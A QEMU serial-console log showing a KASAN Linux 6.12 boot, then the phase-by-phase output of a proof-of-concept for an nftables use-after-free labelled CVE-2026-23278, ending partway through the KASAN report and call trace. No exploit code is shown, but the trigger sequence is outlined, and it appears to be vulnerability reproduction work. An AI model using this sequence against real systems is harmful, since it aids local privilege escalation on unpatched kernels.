bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
c[?7l[2J[0mSeaBIOS (version 1.16.2-debian-1.16.2-1)


iPXE (http://ipxe.org) 00:03.0 CA00 PCI2.10 PnP PMM+7EFCEF00+7EF0EF00 CA00
Press Ctrl-B to configure iPXE (PCI 00:03.0)...                                                                               


Booting from ROM...
c[?7l[2JNo EFI environment detected.
early console in extract_kernel
input_data: 0x00000000051b32c4
input_len: 0x0000000001b9c473
output: 0x0000000001000000
output_len: 0x0000000005cd245c
kernel_total_size: 0x0000000005830000
needed_size: 0x0000000005e00000
trampoline_32bit: 0x0000000000000000


KASLR disabled: 'nokaslr' on cmdline.


Decompressing Linux... Parsing ELF... No relocation needed... done.
Booting the kernel (entry_offset: 0x0000000000000000).
[    0.000000] Linux version 6.12.0-dirty (root@buildkitsandbox) (gcc (Debian 12.2.0-14+deb12u1) 12.2.0, GNU ld (GNU Binutils for Debian) 2.40) #1 SMP PREEMPT_DYNAMIC Mon May 18 06:40:38 UTC 2026
[    0.000000] Command line: console=ttyS0 oops=panic panic=-1 nokaslr earlyprintk=serial
[    0.000000] BIOS-provided physical RAM map:
[    0.000000] BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usable
[    0.000000] BIOS-e820: [mem 0x000000000009fc00-0x000000000009ffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000000f0000-0x00000000000fffff] reserved
[    0.000000] BIOS-e820: [mem 0x0000000000100000-0x000000007ffdffff] usable
[    0.000000] BIOS-e820: [mem 0x000000007ffe0000-0x000000007fffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000feffc000-0x00000000feffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000fffc0000-0x00000000ffffffff] reserved
[    0.000000] printk: legacy bootconsole [earlyser0] enabled
[    0.000000] NX (Execute Disable) protection: active
[    0.000000] APIC: Static calls initialized
[    0.000000] SMBIOS 2.8 present.
[    0.000000] DMI: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    0.000000] DMI: Memory slots populated: 1/1
[    0.000000] Hypervisor detected: KVM
[    0.000000] kvm-clock: Using msrs 4b564d01 and 4b564d00
[    0.000001] kvm-clock: using sched offset of 612346664 cycles
[    0.001980] clocksource: kvm-clock: mask: 0xffffffffffffffff max_cycles: 0x1cd42e4dffb, max_idle_ns: 881590591483 ns
[    0.006454] tsc: Detected 2995.200 MHz processor
[    0.008338] last_pfn = 0x7ffe0 max_arch_pfn = 0x400000000
[    0.010406] MTRR map: 4 entries (3 fixed + 1 variable; max 19), built from 8 variable MTRRs
[    0.012744] x86/PAT: Configuration [0-7]: WB  WC  UC- UC  WB  WP  UC- WT  
[    0.025259] found SMP MP-table at [mem 0x000f5ba0-0x000f5baf]
[    0.027077] Using GB pages for direct mapping
[    0.030946] Incomplete global flushes, disabling PCID
[    0.031164] RAMDISK: [mem 0x7fe52000-0x7ffdffff]
[    0.033868] ACPI: Early table checksum verification disabled
[    0.035468] ACPI: RSDP 0x00000000000F59D0 000014 (v00 BOCHS )
[    0.037116] ACPI: RSDT 0x000000007FFE1B33 000034 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.039780] ACPI: FACP 0x000000007FFE19DF 000074 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.044067] ACPI: DSDT 0x000000007FFE0040 00199F (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.047664] ACPI: FACS 0x000000007FFE0000 000040
[    0.049189] ACPI: APIC 0x000000007FFE1A53 000080 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.051783] ACPI: HPET 0x000000007FFE1AD3 000038 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.054486] ACPI: WAET 0x000000007FFE1B0B 000028 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.057957] ACPI: Reserving FACP table memory at [mem 0x7ffe19df-0x7ffe1a52]
[    0.060596] ACPI: Reserving DSDT table memory at [mem 0x7ffe0040-0x7ffe19de]
[    0.062969] ACPI: Reserving FACS table memory at [mem 0x7ffe0000-0x7ffe003f]
[    0.065036] ACPI: Reserving APIC table memory at [mem 0x7ffe1a53-0x7ffe1ad2]
[    0.067181] ACPI: Reserving HPET table memory at [mem 0x7ffe1ad3-0x7ffe1b0a]
[    0.069298] ACPI: Reserving WAET table memory at [mem 0x7ffe1b0b-0x7ffe1b32]
[    0.072443] No NUMA configuration found
[    0.074613] Faking a node at [mem 0x0000000000000000-0x000000007ffdffff]
[    0.078860] NODE_DATA(0) allocated [mem 0x7fe4e940-0x7fe51fff]
[    0.081534] Zone ranges:
[    0.082438]   DMA      [mem 0x0000000000001000-0x0000000000ffffff]
[    0.084612]   DMA32    [mem 0x0000000001000000-0x000000007ffdffff]
[    0.086617]   Normal   empty
[    0.087558] Movable zone start for each node
[    0.088913] Early memory node ranges
[    0.090107]   node   0: [mem 0x0000000000001000-0x000000000009efff]
[    0.093109]   node   0: [mem 0x0000000000100000-0x000000007ffdffff]
[    0.095177] Initmem setup node 0 [mem 0x0000000000001000-0x000000007ffdffff]
[    0.101384] On node 0, zone DMA: 1 pages in unavailable ranges
[    0.104138] On node 0, zone DMA: 97 pages in unavailable ranges
[    0.171423] On node 0, zone DMA32: 32 pages in unavailable ranges
[    0.683164] kasan: KernelAddressSanitizer initialized
[    0.685428] ACPI: PM-Timer IO Port: 0x608
[    0.686525] ACPI: LAPIC_NMI (acpi_id[0xff] dfl dfl lint[0x1])
[    0.688128] IOAPIC[0]: apic_id 0, version 17, address 0xfec00000, GSI 0-23
[    0.692176] ACPI: INT_SRC_OVR (bus 0 bus_irq 0 global_irq 2 dfl dfl)
[    0.696216] ACPI: INT_SRC_OVR (bus 0 bus_irq 5 global_irq 5 high level)
[    0.699598] ACPI: INT_SRC_OVR (bus 0 bus_irq 9 global_irq 9 high level)
[    0.701434] ACPI: INT_SRC_OVR (bus 0 bus_irq 10 global_irq 10 high level)
[    0.703220] ACPI: INT_SRC_OVR (bus 0 bus_irq 11 global_irq 11 high level)
[    0.705112] ACPI: Using ACPI (MADT) for SMP configuration information
[    0.706893] ACPI: HPET id: 0x8086a201 base: 0xfed00000
[    0.708345] TSC deadline timer available
[    0.709484] CPU topo: Max. logical packages:   1
[    0.710573] CPU topo: Max. logical dies:       1
[    0.711847] CPU topo: Max. dies per package:   1
[    0.713224] CPU topo: Max. threads per core:   1
[    0.715079] CPU topo: Num. cores per package:     2
[    0.716431] CPU topo: Num. threads per package:   2
[    0.717773] CPU topo: Allowing 2 present CPUs plus 0 hotplug CPUs
[    0.719561] kvm-guest: APIC: eoi() replaced with kvm_guest_apic_eoi_write()
[    0.721429] kvm-guest: KVM setup pv remote TLB flush
[    0.722666] kvm-guest: setup PV sched yield
[    0.723793] PM: hibernation: Registered nosave memory: [mem 0x00000000-0x00000fff]
[    0.725853] PM: hibernation: Registered nosave memory: [mem 0x0009f000-0x0009ffff]
[    0.727894] PM: hibernation: Registered nosave memory: [mem 0x000a0000-0x000effff]
[    0.729946] PM: hibernation: Registered nosave memory: [mem 0x000f0000-0x000fffff]
[    0.732248] [mem 0x80000000-0xfeffbfff] available for PCI devices
[    0.734236] Booting paravirtualized kernel on KVM
[    0.735524] clocksource: refined-jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1910969940391419 ns
[    0.751588] setup_percpu: NR_CPUS:64 nr_cpumask_bits:2 nr_cpu_ids:2 nr_node_ids:1
[    0.755454] percpu: Embedded 68 pages/cpu s241496 r8192 d28840 u1048576
[    0.757180] Kernel command line: console=ttyS0 oops=panic panic=-1 nokaslr earlyprintk=serial
[    0.759533] Unknown kernel command line parameters "nokaslr", will be passed to user space.
[    0.761577] random: crng init done
[    0.762741] Dentry cache hash table entries: 262144 (order: 9, 2097152 bytes, linear)
[    0.765195] Inode-cache hash table entries: 131072 (order: 8, 1048576 bytes, linear)
[    0.767780] Fallback order for Node 0: 0 
[    0.767793] Built 1 zonelists, mobility grouping on.  Total pages: 524158
[    0.770421] Policy zone: DMA32
[    0.771257] mem auto-init: stack:all(zero), heap alloc:off, heap free:off
[    0.773053] stackdepot: allocating hash table via alloc_large_system_hash
[    0.774664] stackdepot hash table entries: 1048576 (order: 12, 16777216 bytes, linear)
[    0.844300] SLUB: HWalign=64, Order=0-3, MinObjects=0, CPUs=2, Nodes=1
Poking KASLR using RDRAND RDTSC...
[    0.849426] Dynamic Preempt: voluntary
[    0.851280] rcu: Preemptible hierarchical RCU implementation.
[    0.853301] rcu: 	RCU event tracing is enabled.
[    0.854842] rcu: 	RCU restricting CPUs from NR_CPUS=64 to nr_cpu_ids=2.
[    0.856136] 	Trampoline variant of Tasks RCU enabled.
[    0.856871] rcu: RCU calculated value of scheduler-enlistment delay is 100 jiffies.
[    0.858823] rcu: Adjusting geometry for rcu_fanout_leaf=16, nr_cpu_ids=2
[    0.861008] RCU Tasks: Setting shift to 1 and lim to 1 rcu_task_cb_adjust=1 rcu_task_cpu_ids=2.
[    0.872930] NR_IRQS: 4352, nr_irqs: 440, preallocated irqs: 16
[    0.875027] rcu: srcu_init: Setting srcu_struct sizes based on contention.
[    0.884926] Console: colour VGA+ 80x25
[    0.885711] printk: legacy console [ttyS0] enabled
[    0.885711] printk: legacy console [ttyS0] enabled
[    0.887793] printk: legacy bootconsole [earlyser0] disabled
[    0.887793] printk: legacy bootconsole [earlyser0] disabled
[    0.891624] ACPI: Core revision 20240827
[    0.893297] clocksource: hpet: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 19112604467 ns
[    0.896488] APIC: Switch to symmetric I/O mode setup
[    0.898164] kvm-guest: APIC: send_IPI_mask() replaced with kvm_send_ipi_mask()
[    0.899645] kvm-guest: APIC: send_IPI_mask_allbutself() replaced with kvm_send_ipi_mask_allbutself()
[    0.901333] kvm-guest: setup PV IPIs
[    0.904359] ..TIMER: vector=0x30 apic1=0 pin1=2 apic2=-1 pin2=-1
[    0.905900] clocksource: tsc-early: mask: 0xffffffffffffffff max_cycles: 0x2b2c8ec87c7, max_idle_ns: 440795278598 ns
[    0.909874] Calibrating delay loop (skipped) preset value.. 5990.40 BogoMIPS (lpj=2995200)
[    0.912777] x86/cpu: User Mode Instruction Prevention (UMIP) activated
[    0.915195] Last level iTLB entries: 4KB 0, 2MB 0, 4MB 0
[    0.915771] Last level dTLB entries: 4KB 0, 2MB 0, 4MB 0, 1GB 0
[    0.916836] Spectre V1 : Mitigation: usercopy/swapgs barriers and __user pointer sanitization
[    0.917781] Spectre V2 : Spectre BHI mitigation: SW BHB clearing on syscall and VM exit
[    0.918771] Spectre V2 : Mitigation: Enhanced / Automatic IBRS
[    0.919772] Spectre V2 : Spectre v2 / SpectreRSB mitigation: Filling RSB on context switch
[    0.920772] Spectre V2 : Spectre v2 / PBRSB-eIBRS: Retire a single CALL on VMEXIT
[    0.921784] RETBleed: Mitigation: Enhanced IBRS
[    0.922776] Spectre V2 : mitigation: Enabling conditional Indirect Branch Prediction Barrier
[    0.923774] Speculative Store Bypass: Mitigation: Speculative Store Bypass disabled via prctl
[    0.924781] MMIO Stale Data: Unknown: No mitigations
[    0.925770] Register File Data Sampling: Vulnerable: No microcode
[    0.926837] x86/fpu: Supporting XSAVE feature 0x001: 'x87 floating point registers'
[    0.927771] x86/fpu: Supporting XSAVE feature 0x002: 'SSE registers'
[    0.928772] x86/fpu: Supporting XSAVE feature 0x004: 'AVX registers'
[    0.929773] x86/fpu: xstate_offset[2]:  576, xstate_sizes[2]:  256
[    0.930772] x86/fpu: Enabled xstate features 0x7, context size is 832 bytes, using 'compacted' format.
[    0.958055] Freeing SMP alternatives memory: 48K
[    0.958775] pid_max: default: 32768 minimum: 301
[    0.959976] LSM: initializing lsm=capability,selinux
[    0.961770] SELinux:  Initializing.
[    0.962933] Mount-cache hash table entries: 4096 (order: 3, 32768 bytes, linear)
[    0.963833] Mountpoint-cache hash table entries: 4096 (order: 3, 32768 bytes, linear)
[    0.967288] smpboot: CPU0: 13th Gen Intel(R) Core(TM) i9-13900H (family: 0x6, model: 0xba, stepping: 0x2)
[    0.969912] Performance Events: unsupported p6 CPU model 186 no PMU driver, software events only.
[    0.970870] signal: max sigframe size: 1776
[    0.971942] rcu: Hierarchical SRCU implementation.
[    0.972776] rcu: 	Max phase no-delay instances is 400.
[    0.974244] Timer migration: 1 hierarchy levels; 8 children per group; 1 crossnode level
[    0.975590] smp: Bringing up secondary CPUs ...
[    0.978045] smpboot: x86: Booting SMP configuration:
[    0.978778] .... node  #0, CPUs:      #1
[    0.980867] smp: Brought up 1 node, 2 CPUs
[    0.982685] smpboot: Total of 2 processors activated (11980.80 BogoMIPS)
[    0.983608] Memory: 1672848K/2096632K available (53248K kernel code, 8626K rwdata, 11176K rodata, 6000K init, 1424K bss, 418744K reserved, 0K cma-reserved)
[    0.985806] devtmpfs: initialized
[    0.991239] clocksource: jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1911260446275000 ns
[    0.993782] futex hash table entries: 512 (order: 3, 32768 bytes, linear)
[    0.996109] PM: RTC time: 06:41:44, date: 2026-05-18
[    0.998943] NET: Registered PF_NETLINK/PF_ROUTE protocol family
[    1.001866] audit: initializing netlink subsys (disabled)
[    1.004065] audit: type=2000 audit(1779086504.739:1): state=initialized audit_enabled=0 res=1
[    1.005132] thermal_sys: Registered thermal governor 'step_wise'
[    1.005777] thermal_sys: Registered thermal governor 'user_space'
[    1.006863] cpuidle: using governor menu
[    1.009727] PCI: Using configuration type 1 for base access
[    1.009938] kprobes: kprobe jump-optimization is enabled. All kprobes are optimized if possible.
[    1.011801] HugeTLB: registered 2.00 MiB page size, pre-allocated 0 pages
[    1.012780] HugeTLB: 28 KiB vmemmap can be freed for a 2.00 MiB page
[    1.014708] ACPI: Added _OSI(Module Device)
[    1.014780] ACPI: Added _OSI(Processor Device)
[    1.015776] ACPI: Added _OSI(3.0 _SCP Extensions)
[    1.016781] ACPI: Added _OSI(Processor Aggregator Device)
[    1.029699] ACPI: 1 ACPI AML tables successfully acquired and loaded
[    1.034537] ACPI: Interpreter enabled
[    1.035004] ACPI: PM: (supports S0 S3 S4 S5)
[    1.035781] ACPI: Using IOAPIC for interrupt routing
[    1.036929] PCI: Using host bridge windows from ACPI; if necessary, use "pci=nocrs" and report a bug
[    1.037780] PCI: Using E820 reservations for host bridge windows
[    1.039346] ACPI: Enabled 2 GPEs in block 00 to 0F
[    1.058469] ACPI: PCI Root Bridge [PCI0] (domain 0000 [bus 00-ff])
[    1.058793] acpi PNP0A03:00: _OSC: OS supports [ASPM ClockPM Segments MSI HPX-Type3]
[    1.059781] acpi PNP0A03:00: _OSC: not requesting OS control; OS requires [ExtendedConfig ASPM ClockPM MSI]
[    1.060905] acpi PNP0A03:00: fail to add MMCONFIG information, can't access extended configuration space under this bridge
[    1.062065] PCI host bridge to bus 0000:00
[    1.062819] pci_bus 0000:00: root bus resource [io  0x0000-0x0cf7 window]
[    1.063790] pci_bus 0000:00: root bus resource [io  0x0d00-0xffff window]
[    1.064787] pci_bus 0000:00: root bus resource [mem 0x000a0000-0x000bffff window]
[    1.065812] pci_bus 0000:00: root bus resource [mem 0x80000000-0xfebfffff window]
[    1.066787] pci_bus 0000:00: root bus resource [mem 0x100000000-0x17fffffff window]
[    1.067781] pci_bus 0000:00: root bus resource [bus 00-ff]
[    1.068879] pci 0000:00:00.0: [8086:1237] type 00 class 0x060000 conventional PCI endpoint
[    1.081988] pci 0000:00:01.0: [8086:7000] type 00 class 0x060100 conventional PCI endpoint
[    1.091344] pci 0000:00:01.1: [8086:7010] type 00 class 0x010180 conventional PCI endpoint
[    1.094589] pci 0000:00:01.1: BAR 4 [io  0xc040-0xc04f]
[    1.097203] pci 0000:00:01.1: BAR 0 [io  0x01f0-0x01f7]: legacy IDE quirk
[    1.097786] pci 0000:00:01.1: BAR 1 [io  0x03f6]: legacy IDE quirk
[    1.098877] pci 0000:00:01.1: BAR 2 [io  0x0170-0x0177]: legacy IDE quirk
[    1.099777] pci 0000:00:01.1: BAR 3 [io  0x0376]: legacy IDE quirk
[    1.101980] pci 0000:00:01.3: [8086:7113] type 00 class 0x068000 conventional PCI endpoint
[    1.104234] pci 0000:00:01.3: quirk: [io  0x0600-0x063f] claimed by PIIX4 ACPI
[    1.104796] pci 0000:00:01.3: quirk: [io  0x0700-0x070f] claimed by PIIX4 SMB
[    1.106627] pci 0000:00:02.0: [1234:1111] type 00 class 0x030000 conventional PCI endpoint
[    1.108684] pci 0000:00:02.0: BAR 0 [mem 0xfd000000-0xfdffffff pref]
[    1.111922] pci 0000:00:02.0: BAR 2 [mem 0xfebf0000-0xfebf0fff]
[    1.117769] pci 0000:00:02.0: ROM [mem 0xfebe0000-0xfebeffff pref]
[    1.120265] pci 0000:00:02.0: Video device with shadowed ROM at [mem 0x000c0000-0x000dffff]
[    1.132395] pci 0000:00:03.0: [8086:100e] type 00 class 0x020000 conventional PCI endpoint
[    1.133802] pci 0000:00:03.0: BAR 0 [mem 0xfebc0000-0xfebdffff]
[    1.135801] pci 0000:00:03.0: BAR 1 [io  0xc000-0xc03f]
[    1.141781] pci 0000:00:03.0: ROM [mem 0xfeb80000-0xfebbffff pref]
[    1.153765] ACPI: PCI: Interrupt link LNKA configured for IRQ 10
[    1.154783] ACPI: PCI: Interrupt link LNKB configured for IRQ 10
[    1.156550] ACPI: PCI: Interrupt link LNKC configured for IRQ 11
[    1.157436] ACPI: PCI: Interrupt link LNKD configured for IRQ 11
[    1.158859] ACPI: PCI: Interrupt link LNKS configured for IRQ 9
[    1.163759] iommu: Default domain type: Translated
[    1.164778] iommu: DMA domain TLB invalidation policy: lazy mode
[    1.167526] SCSI subsystem initialized
[    1.169250] ACPI: bus type USB registered
[    1.171145] usbcore: registered new interface driver usbfs
[    1.171932] usbcore: registered new interface driver hub
[    1.173852] usbcore: registered new device driver usb
[    1.175059] pps_core: LinuxPPS API ver. 1 registered
[    1.176778] pps_core: Software ver. 5.3.6 - Copyright 2005-2007 Rodolfo Giometti <giometti@linux.it>
[    1.179863] PTP clock support registered
[    1.182381] Advanced Linux Sound Architecture Driver Initialized.
[    1.186404] NetLabel: Initializing
[    1.186777] NetLabel:  domain hash size = 128
[    1.187775] NetLabel:  protocols = UNLABELED CIPSOv4 CALIPSO
[    1.190019] NetLabel:  unlabeled traffic allowed by default
[    1.192778] PCI: Using ACPI for IRQ routing
[    1.194874] pci 0000:00:02.0: vgaarb: setting as boot VGA device
[    1.195769] pci 0000:00:02.0: vgaarb: bridge control possible
[    1.195769] pci 0000:00:02.0: vgaarb: VGA device added: decodes=io+mem,owns=io+mem,locks=none
[    1.199812] vgaarb: loaded
[    1.202700] hpet0: at MMIO 0xfed00000, IRQs 2, 8, 0
[    1.203811] hpet0: 3 comparators, 64-bit 100.000000 MHz counter
[    1.208481] clocksource: Switched to clocksource kvm-clock
[    1.211834] VFS: Disk quotas dquot_6.6.0
[    1.215792] VFS: Dquot-cache hash table entries: 512 (order 0, 4096 bytes)
[    1.222147] pnp: PnP ACPI init
[    1.225611] pnp: PnP ACPI: found 6 devices
[    1.247037] clocksource: acpi_pm: mask: 0xffffff max_cycles: 0xffffff, max_idle_ns: 2085701024 ns
[    1.249838] NET: Registered PF_INET protocol family
[    1.251694] IP idents hash table entries: 32768 (order: 6, 262144 bytes, linear)
[    1.256213] tcp_listen_portaddr_hash hash table entries: 1024 (order: 2, 16384 bytes, linear)
[    1.258890] Table-perturb hash table entries: 65536 (order: 6, 262144 bytes, linear)
[    1.261020] TCP established hash table entries: 16384 (order: 5, 131072 bytes, linear)
[    1.264921] TCP bind hash table entries: 16384 (order: 7, 524288 bytes, linear)
[    1.266950] TCP: Hash tables configured (established 16384 bind 16384)
[    1.269287] UDP hash table entries: 1024 (order: 3, 32768 bytes, linear)
[    1.271975] UDP-Lite hash table entries: 1024 (order: 3, 32768 bytes, linear)
[    1.275354] NET: Registered PF_UNIX/PF_LOCAL protocol family
[    1.281302] RPC: Registered named UNIX socket transport module.
[    1.282915] RPC: Registered udp transport module.
[    1.284212] RPC: Registered tcp transport module.
[    1.285552] RPC: Registered tcp-with-tls transport module.
[    1.287103] RPC: Registered tcp NFSv4.1 backchannel transport module.
[    1.290182] pci_bus 0000:00: resource 4 [io  0x0000-0x0cf7 window]
[    1.291690] pci_bus 0000:00: resource 5 [io  0x0d00-0xffff window]
[    1.293202] pci_bus 0000:00: resource 6 [mem 0x000a0000-0x000bffff window]
[    1.294759] pci_bus 0000:00: resource 7 [mem 0x80000000-0xfebfffff window]
[    1.296408] pci_bus 0000:00: resource 8 [mem 0x100000000-0x17fffffff window]
[    1.298261] pci 0000:00:01.0: PIIX3: Enabling Passive Release
[    1.299631] pci 0000:00:00.0: Limiting direct PCI/PCI transfers
[    1.301212] PCI: CLS 0 bytes, default 64
[    1.303007] Unpacking initramfs...
[    1.304078] RAPL PMU: API unit is 2^-32 Joules, 0 fixed counters, 10737418240 ms ovfl timer
[    1.306875] clocksource: tsc: mask: 0xffffffffffffffff max_cycles: 0x2b2c8ec87c7, max_idle_ns: 440795278598 ns
[    1.313076] Initialise system trusted keyrings
[    1.314363] workingset: timestamp_bits=56 max_order=19 bucket_order=0
[    1.319703] NFS: Registering the id_resolver key type
[    1.321072] Key type id_resolver registered
[    1.321933] Key type id_legacy registered
[    1.323093] 9p: Installing v9fs 9p2000 file system support
[    1.335511] Key type asymmetric registered
[    1.336094] Freeing initrd memory: 1592K
[    1.336529] Asymmetric key parser 'x509' registered
[    1.336711] Block layer SCSI generic (bsg) driver version 0.4 loaded (major 251)
[    1.341888] io scheduler mq-deadline registered
[    1.343089] io scheduler kyber registered
[    1.345179] input: Power Button as /devices/LNXSYSTM:00/LNXPWRBN:00/input/input0
[    1.347504] ACPI: button: Power Button [PWRF]
[    1.350368] Serial: 8250/16550 driver, 4 ports, IRQ sharing enabled
[    1.352774] 00:04: ttyS0 at I/O 0x3f8 (irq = 4, base_baud = 115200) is a 16550A
[    1.356860] Non-volatile memory driver v1.3
[    1.358086] Linux agpgart interface v0.103
[    1.359688] ACPI: bus type drm_connector registered
[    1.370854] loop: module loaded
[    1.376204] scsi host0: ata_piix
[    1.377567] scsi host1: ata_piix
[    1.378319] ata1: PATA max MWDMA2 cmd 0x1f0 ctl 0x3f6 bmdma 0xc040 irq 14 lpm-pol 0
[    1.379746] ata2: PATA max MWDMA2 cmd 0x170 ctl 0x376 bmdma 0xc048 irq 15 lpm-pol 0
[    1.383520] e100: Intel(R) PRO/100 Network Driver
[    1.384916] e100: Copyright(c) 1999-2006 Intel Corporation
[    1.386395] e1000: Intel(R) PRO/1000 Network Driver
[    1.387622] e1000: Copyright (c) 1999-2006 Intel Corporation.
[    1.536810] ata2: found unknown device (class 0)
[    1.539102] ata2.00: ATAPI: QEMU DVD-ROM, 2.5+, max UDMA/100
[    1.545090] scsi 1:0:0:0: CD-ROM            QEMU     QEMU DVD-ROM     2.5+ PQ: 0 ANSI: 5
[    1.562212] sr 1:0:0:0: [sr0] scsi3-mmc drive: 4x/4x cd/rw xa/form2 tray
[    1.563722] cdrom: Uniform CD-ROM driver Revision: 3.20
[    1.573406] sr 1:0:0:0: Attached scsi generic sg0 type 5
[    1.855323] ACPI: \_SB_.LNKC: Enabled at IRQ 11
[    2.216225] e1000 0000:00:03.0 eth0: (PCI:33MHz:32-bit) 52:54:00:12:34:56
[    2.217943] e1000 0000:00:03.0 eth0: Intel(R) PRO/1000 Network Connection
[    2.219996] e1000e: Intel(R) PRO/1000 Network Driver
[    2.221291] e1000e: Copyright(c) 1999 - 2015 Intel Corporation.
[    2.222852] sky2: driver version 1.30
[    2.224964] usbcore: registered new interface driver usblp
[    2.226980] usbcore: registered new interface driver usb-storage
[    2.232900] i8042: PNP: PS/2 Controller [PNP0303:KBD,PNP0f13:MOU] at 0x60,0x64 irq 1,12
[    2.237280] serio: i8042 KBD port at 0x60,0x64 irq 1
[    2.238601] serio: i8042 AUX port at 0x60,0x64 irq 12
[    2.240959] rtc_cmos 00:05: RTC can wake from S4
[    2.242864] input: AT Translated Set 2 keyboard as /devices/platform/i8042/serio0/input/input1
[    2.245085] rtc_cmos 00:05: registered as rtc0
[    2.247023] rtc_cmos 00:05: alarms up to one day, y3k, 242 bytes nvram, hpet irqs
[    2.249787] device-mapper: ioctl: 4.48.0-ioctl (2023-03-01) initialised: dm-devel@lists.linux.dev
[    2.252804] intel_pstate: CPU model not supported
[    2.255754] hid: raw HID events driver (C) Jiri Kosina
[    2.259508] usbcore: registered new interface driver usbhid
[    2.261027] usbhid: USB HID core driver
[    2.266784] Initializing XFRM netlink socket
[    2.268143] NET: Registered PF_INET6 protocol family
[    2.272882] Segment Routing with IPv6
[    2.274346] In-situ OAM (IOAM) with IPv6
[    2.275871] sit: IPv6, IPv4 and MPLS over IPv4 tunneling driver
[    2.280548] NET: Registered PF_PACKET protocol family
[    2.282034] 9pnet: Installing 9P2000 support
[    2.283194] Key type dns_resolver registered
[    2.285301] IPI shorthand broadcast: enabled
[    2.306574] sched_clock: Marking stable (2280006194, 26378701)->(2442959831, -136574936)
[    2.309783] registered taskstats version 1
[    2.310954] Loading compiled-in X.509 certificates
[    2.324827] Demotion targets for Node 0: null
[    2.326312] PM:   Magic number: 10:114:671
[    2.327505] workqueue scsi_tmf_1: hash matches
[    2.328857] printk: legacy console [netcon0] enabled
[    2.330704] netconsole: network logging started
[    2.332671] cfg80211: Loading compiled-in X.509 certificates for regulatory database
[    2.336342] kworker/u8:1 (54) used greatest stack depth: 29664 bytes left
[    2.338412] kworker/u8:1 (55) used greatest stack depth: 29488 bytes left
[    2.339244] Loaded X.509 cert 'sforshee: 00b28ddf47aef9cea7'
[    2.341844] Loaded X.509 cert 'wens: 61c038651aabdcf94bd0ac7ff06c7248db18c600'
[    2.344014] platform regulatory.0: Direct firmware load for regulatory.db failed with error -2
[    2.344570] ALSA device list:
[    2.346098] cfg80211: failed to load regulatory.db
[    2.346793]   No soundcards found.
[    2.357637] Freeing unused kernel image (initmem) memory: 6000K
[    2.358712] Write protecting the kernel read-only data: 65536k
[    2.361568] Freeing unused kernel image (rodata/data gap) memory: 1112K
[    2.374278] x86/mm: Checked W+X mappings: passed, no W+X pages found.
[    2.375316] Run /init as init process
[    2.378650] mkdir (58) used greatest stack depth: 28840 bytes left
[    2.380670] mount (59) used greatest stack depth: 28304 bytes left
[    2.382117] mount (60) used greatest stack depth: 28288 bytes left

secb: rootfs ready
---- poc begin ----
[*] CVE-2026-23278 trigger (nftables catchall break -> chain UAF)
[*] entered userns + netns (CAP_NET_ADMIN granted)
[*] phase 1: build table/base_chain/vmap/target_chain
    [drain phase1-setup] acks=4 last_err=0
[*] phase 1b: add catchall_A (goto tc) + lookup rule
    [drain phase1-bind] acks=2 last_err=0
[*] phase 2: send abort batch (expects ENOENT)
    [!] phase2-abort seq=15 err=2 (No such file or directory)
[    2.675811] input: ImExPS/2 Generic Explorer Mouse as /devices/platform/i8042/serio1/input/input3
    [drain phase2-abort] acks=5 last_err=-2
[*] phase 3: DELCHAIN(tc) -> kfree(target_chain)
    [drain phase[    2.832731] ==================================================================
3-delchain] acks[    2.834012] BUG: KASAN: slab-use-after-free in nft_data_release+0xa1/0xd0
=1 last_err=0
[[    2.835273] Read of size 4 at addr ffff8880092cfc50 by task poc/65
*] phase 4: DELT[    2.836423] 
ABLE(t) -> UAF w[    2.836879] CPU: 0 UID: 0 PID: 65 Comm: poc Not tainted 6.12.0-dirty #1
rite in nft_verd[    2.838062] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
ict_uninit
[    2.839721] Call Trace:
[    2.840292]  <TASK>
[    2.840624]  dump_stack_lvl+0x53/0x70
[    2.841174]  print_report+0xce/0x660
[    2.841728]  ? nft_data_release+0xa1/0xd0
[    2.842260]  kasan_report+0xc6/0x100
[    2.842778]  ? nft_data_release+0xa1/0xd0
[    2.843438]  nft_data_release+0xa1/0xd0
[    2.844050]  nft_setelem_data_deactivate+0xe0/0x200
[    2.844685]  nft_map_deactivate+0x2f7/0x440
[    2.845357]  ? __pfx_nft_map_deactivate+0x10/0x10
[    2.845982]  ? __pfx_nft_mapelem_deactivate+0x10/0x10
[    2.846952]  ? __kmalloc_noprof+0x161/0x350
[    2.847562]  ? nft_trans_alloc_gfp+0x1a/0x320
[    2.848390]  nft_delset+0x248/0x320
[    2.848838]  nft_flush_table+0x24c/0x9c0
[    2.849345]  ? nft_table_lookup.part.0+0xf7/0x200
[    2.850007]  nf_tables_deltable+0x660/0xd10
[    2.850529]  ? __pfx_nf_tables_deltable+0x10/0x10
[    2.851200]  ? __pfx___nla_validate_parse+0x10/0x10
[    2.851945]  ? mutex_unlock+0x7e/0xd0
[    2.852516]  ? __pfx_mutex_unlock+0x10/0x10
[    2.853057]  nfnetlink_rcv_batch+0x13e6/0x1e30
[    2.853635]  ? __pfx_nfnetlink_rcv_batch+0x10/0x10
[    2.854268]  ? stack_depot_save_flags+0x28/0x6c0
[    2.854855]  ? __x64_sys_sendto+0xdb/0x1b0
[    2.855466]  ? do_syscall_64+0xa6/0x1a0
[    2.856097]  ? entry_SYSCALL_64_after_hwframe+0x77/0x7f
[    2.856835]  nfnetlink_rcv+0x2df/0x360
[    2.857344]  ? __pfx_nfnetlink_rcv+0x10/0x10
[    2.858007]  ? kmem_cache_alloc_node_noprof+0xe2/0x280
[    2.858626]  ? _copy_from_iter+0x214/0x1130
[    2.859307]  netlink_unicast+0x5c2/0x830
[    2.859930]  ? __pfx_netlink_unicast+0x10/0x10
[    2.860498]  netlink_sendmsg+0x75c/0xc00
